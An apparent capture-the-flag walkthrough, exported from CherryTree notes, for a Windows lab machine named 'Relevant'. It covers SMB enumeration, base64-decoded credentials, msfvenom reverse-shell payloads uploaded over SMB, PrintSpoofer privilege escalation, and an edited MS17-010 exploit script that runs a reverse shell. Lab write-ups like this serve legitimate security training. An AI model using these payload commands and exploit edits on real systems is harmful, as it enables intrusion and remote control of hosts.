<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>relevant</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>relevant</h1><br/><strong>Relevant</strong><br />Target Machine IP: <strong>10.10.20.25		10.10.6.72</strong>		<strong>10.10.227.128</strong><br /><br />We start basic nmap scan.<br /><br />nmap -A 10.10.20.25<br /><br /><a href=""><img src="images/123-1.png" alt="images/123-1.png" /></a><br /><br />We open the webserver running on Port 80 and find a default Microsoft IIS webpage.<br /><br />Next, I try to enumearte smaba shares on Port 445<br /><br />I give -U guest with dummy password. it throws error.<br />I try with no user and dummy password when asked for root password. It works!<br /><br /><a href=""><img src="images/123-2.png" alt="images/123-2.png" /></a><br /><br /><a href=""><img src="images/123-3.png" alt="images/123-3.png" /></a><br /><br /><a href=""><img src="images/123-4.png" alt="images/123-4.png" /></a><br /><br />I then decode the passwords using base64<br /><br /><a href=""><img src="images/123-5.png" alt="images/123-5.png" /></a><br /><br />We keep this information for future reference.<br /><br /><br /><strong><span style="text-decoration:underline;">Foothold : Way - 1</span></strong><br />Now, I will try to enumerate directories for the web server.<br /><br />But we do not find any directories.<br /><br />We use nmap again to scan all ports using -p- option.<br /><em><strong>nmap -sS -p- 10.10.20.25</strong></em><br /><br />This will find 4 new ports. We scan them again.<br /><br /><a href=""><img src="images/123-6.png" alt="images/123-6.png" /></a><br /><br /><br />We find the port <strong>49663</strong> also has a web server.<br />We use gobuster again to find hidden directories, but we didn&#39;t find any.<br /><br />Then we try the same name of samba share as a directory.<br /><br /><em>http://10.10.20.25:80/nt4wrksv/passwords.txt</em><br /><em><strong>http://10.10.20.25:49663/nt4wrksv/passwords.txt</strong></em><br /><br />The second URL prints the passwords.txt file which we downloaded eralier.<br /><br />Using the Port 49663 we can access the samba shared file. Thus we can upload a (ASPX Reverse Shell) in the samba share and run it from the web server at port 49663<br /><br />Note: The Wappalyzer app of Firefox hinted the ASP .Net Backend web framework<br /><br /><em><strong>msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.11.72.31 LPORT=7777 -f aspx -o shell.aspx</strong></em><br /><br />We connect to the samba share and upload the file using the following command.<br /><em><strong>put shell.aspx</strong></em><br /><br />We start a netcat listener on attack machine.<br /><br />Then trigger the reverse shell using the following URL:<br /><em><strong>http://10.10.6.72:49663/ntwrksv/shell.aspx</strong></em><br /><br />We will get a shell as normal user.<br /><em><strong>iis apppool\defaultapppool</strong></em><br /><br />However, with this user we can get the user flag from <em><strong>C:\Users\Bob\Desktop\user.txt</strong></em><br /><br /><strong>Privilege Escalation:</strong><br />We run<br />whoami /priv<br /><br /><a href=""><img src="images/123-7.png" alt="images/123-7.png" /></a><br /><br />It confirm that <strong>SeImpersonatePrivilege</strong> is enabled. We will use the following to exploit this.<br /><br /><em><strong>https://github.com/itm4n/PrintSpoofer</strong></em><br /><br />We download the <em><strong>PrintSpoofer64.exe</strong></em> from the github release.<br /><br />We upload it to the server using smb.<br /><em><strong>put PrintSpoofer64.exe</strong></em><br /><br />We find the location in our revershell using the <em><strong>“net share”</strong></em> command that lists all windows shares.<br /><br />We go to the location and run:<br /><em><strong>Printspoofer64.exe -i -c cmd.exe</strong></em><br /><br /><a href=""><img src="images/123-8.png" alt="images/123-8.png" /></a><br /><br />Now we have system access. We get the root flag at C:\Users\Administrator\Desktop\root.txt<br /><br /><br /><strong><span style="text-decoration:underline;">Foothold : Way - 2</span></strong><br /><br />We begin by doing nmap again, but this time we use <strong>vuln</strong> script to check for vulnerabilities.<br /><br /><em><strong>nmap --script vuln 10.10.20.25 </strong></em>	[Note: Generally we should include ports with -p for efficiency]<br /><br />This will show <strong>ms17-010</strong> vulnerability.<br /><br /><strong>Note: </strong>As the server is not running windows 7, we cannot run “<strong>eternalblue</strong>” exploit directly from metasploit framework.<br /><br />Thus, we search for ms17-010 in exploit database.<br /><br /><a href=""><img src="images/123-9.png" alt="images/123-9.png" /></a><br /><br />We will use the python code that supports <strong>Microsoft Windows 2016 R2</strong> (This was hinted in OS detection of initial nmap scan.<br /><br />Get the file to user working directory using.<br /><br /><em><strong>searchsploit -m windows/remote/42315.py</strong></em><br /><br /><strong>Note: </strong>This will require <strong>python2</strong><br />(So impacket also has be installed for python2. [pip2 install impacket])<br /><br />Then examine the file and edit the following:<br /> 	<br />1) We need to give values in username and password.<br />Luckily we have 2 usernames and passwords.<br /><strong><br />Note:</strong> While enumerating the machine earlier, I tried to RDP into the machine using the gained credentials.<br />Both the users couldn&#39;t login. However, the error message of user <strong>Jill</strong> suggested that her password is expired.<br />Thus for our python program lets start with <strong>Bob</strong> and <strong>!P@$$W0rD!123</strong><br /><br />2) Starting from Line 916. Comment out the following. The following lines are used to create a file bane “pwned.txt” as a POC. However, we need a reverse shell, so we will replace it the following.<br /><br /><em>	#print(&#39;creating file c:\\pwned.txt on the target&#39;)<br />	#tid2 = smbConn.connectTree(&#39;C$&#39;)<br />	#fid2 = smbConn.createFile(tid2, &#39;/pwned.txt&#39;)<br />	#smbConn.closeFile(tid2, fid2)<br />	#smbConn.disconnectTree(tid2)</em><br /><br /><em><strong>	smb_send_file(smbConn, &#39;rshell.exe&#39;, &#39;C&#39;, &#39;/rshell.exe&#39; )<br />	service_exec(conn, r&#39;C:\rshell.exe&#39;)</strong></em><br /><br />3) Create a reverse shell using msfvenom<br /><br /><em><strong>msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.11.72.31 LPORT=7777 -f exe -o rshell.exe</strong></em><br /><br />3) Get this prequisite file.<br /><em><strong>wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py</strong></em><br /><br />Keep both the <strong>42315.py, mysmb.py and rshell.exe</strong> in the same directory and run the exploit as follows:<br /><br />4) Start a netcat listner: <em><strong>nc -lvnp 7777</strong></em><br /><br />5) Run the exploit using python2: <br /><br /><em><strong>python2 42315.py 10.10.227.128<br /></strong></em><br /><br />We will get a reverse shell in our netcat listener. (we will directly foothold with admin access)<br /><br /><a href=""><img src="images/123-10.png" alt="images/123-10.png" /></a><br /><br /><br />Thanks !!<br /></div>
</body>
</html>
